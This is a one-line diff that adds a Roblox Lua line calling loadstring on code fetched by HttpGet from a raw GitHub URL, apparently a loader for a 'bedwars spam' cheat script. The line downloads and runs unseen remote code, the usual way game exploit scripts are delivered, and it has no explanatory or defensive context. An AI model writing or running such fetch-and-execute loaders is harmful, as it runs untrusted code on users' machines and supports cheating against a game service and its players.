@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/part-2-bedwars-spam6-uwa7q9dxoen9fq.lua"))()
